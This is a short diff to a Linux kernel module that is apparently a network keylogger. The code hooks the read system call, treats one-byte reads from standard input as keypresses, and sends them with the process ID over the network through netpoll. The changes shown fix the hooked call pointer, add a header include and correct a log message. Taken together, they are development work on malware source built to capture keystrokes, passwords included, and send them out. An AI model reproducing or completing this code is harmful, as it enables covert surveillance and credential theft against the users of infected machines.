@@ -21,7 +21,8 @@
 /*                                                                             */
 /*******************************************************************************/
 
-#include <linux/unistd.h>   /* Needed for __NR_read */
+#include <linux/module.h>	/* Needed by all kernel modules */
+#include <linux/unistd.h>
 #include <linux/string.h>
 #include <linux/netpoll.h>
 #include <linux/etherdevice.h>
@@ -40,10 +41,12 @@
 #define LOG_PREF "PID %d says: %s\n"
 #define MAX_PID_CHARS 10
 
+
 /* Definition of global variables */
 static int show_debug_messages;
 asmlinkage long (*read_syscall)(unsigned int, char __user *, size_t);   //TODO: should point to original_read
 struct netpoll *np;
+
 
 /* Definition of functions */
 static int network_keylogging_init(int);
@@ -93,7 +96,7 @@ asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
 	long ret;
 
 	/* Call original read_syscall */
-	ret = original_read_syscall(fd, buf, count);
+	ret = read_syscall(fd, buf, count);
 
 	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
 	if (fd != 0)
@@ -158,7 +161,7 @@ static void netlogger_send(int pid, char *buf, unsigned int len)
 	msg_size = snprintf(msg, msg_size, LOG_PREF, pid, buf);
 
 	if (msg_size <= 0) {
-		printk(KERN_INFO "Somehting went wrong\n");
+		PRINT("Something went wrong!\n");
 		return;
 	}
 
